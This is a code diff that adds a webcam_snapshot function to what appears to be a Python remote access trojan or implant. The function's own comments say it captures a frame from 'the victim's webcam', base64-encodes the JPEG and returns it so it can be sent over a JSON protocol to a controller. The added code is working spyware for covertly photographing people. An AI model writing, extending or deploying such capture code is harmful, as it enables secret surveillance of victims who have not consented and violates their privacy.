@@ -174,3 +174,45 @@ def get_system_info() -> str:
         check=False,
     )
     return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"
+
+
+# ---------------------------------------------------------------------------
+# webcam_snapshot — capture a photo from the victim's webcam
+# ---------------------------------------------------------------------------
+
+
+def webcam_snapshot() -> str:
+    """
+    Capture one frame from the victim's webcam.
+
+    Opens the default camera (index 0), reads one frame,
+    encodes it as JPEG, then returns it as a base64 string
+    so it can be sent over the JSON protocol.
+
+    Returns:
+        str: Base64-encoded JPEG image, or empty string on failure.
+    """
+    import cv2
+
+    cam = cv2.VideoCapture(0)
+    if not cam.isOpened():
+        logger.warning("webcam_snapshot: no webcam available (index 0)")
+        return ""
+
+    try:
+        success, frame = cam.read()
+        if not success:
+            logger.warning("webcam_snapshot: failed to read frame")
+            return ""
+
+        _, buffer = cv2.imencode(".jpg", frame)
+        encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
+        logger.info("webcam_snapshot: frame captured (%d bytes)", len(buffer))
+        return encoded
+
+    except Exception as exc:
+        logger.exception("webcam_snapshot error: %s", exc)
+        return ""
+
+    finally:
+        cam.release()
